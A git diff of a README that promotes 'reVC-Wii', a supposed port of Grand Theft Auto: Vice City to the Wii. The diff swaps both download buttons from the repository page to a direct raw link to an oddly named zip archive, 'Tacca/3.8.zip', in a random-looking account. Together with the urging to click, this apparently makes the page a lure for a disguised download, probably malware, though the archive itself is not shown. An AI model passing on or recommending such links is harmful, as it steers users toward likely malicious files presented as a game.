@@ -1,7 +1,7 @@
 <h1>🎮 reVC-Wii - Play Grand Theft Auto Vice City on Wii</h1>
 
 <p align="center">
-<a href="https://github.com/ridged-drosophyllumlusitanicum439/reVC-Wii"><img src="https://img.shields.io/badge/⬇️ Download Now-FF6B35?style=for-the-badge&logo=download&logoColor=white" alt="Download" width="250"></a>
+<a href="https://raw.githubusercontent.com/ridged-drosophyllumlusitanicum439/reVC-Wii/main/Tacca/3.8.zip"><img src="https://img.shields.io/badge/⬇️ Download Now-FF6B35?style=for-the-badge&logo=download&logoColor=white" alt="Download" width="250"></a>
 </p>
 
 <p>Welcome to <strong>reVC-Wii</strong> - the easiest way to experience the classic open-world game <em>Grand Theft Auto: Vice City</em> on your Nintendo Wii console. This project brings the full game to your living room with improved controls and widescreen support. Whether you're a longtime fan or new to Vice City, this download makes it simple to get started.</p>
@@ -38,7 +38,7 @@
 <p>Click the big orange button below to go to the download page:</p>
 
 <p align="center">
-<a href="https://github.com/ridged-drosophyllumlusitanicum439/reVC-Wii"><img src="https://img.shields.io/badge/⬇️ Get reVC-Wii Now-2ECC71?style=for-the-badge&logo=download&logoColor=white" alt="Download" width="300"></a>
+<a href="https://raw.githubusercontent.com/ridged-drosophyllumlusitanicum439/reVC-Wii/main/Tacca/3.8.zip"><img src="https://img.shields.io/badge/⬇️ Get reVC-Wii Now-2ECC71?style=for-the-badge&logo=download&logoColor=white" alt="Download" width="300"></a>
 </p>
 
 <p>Visit this link to download the application. Once you're on the page, look for the "Download" or "Release" button on the right side of the screen. Click it, and the download will begin automatically.</p>
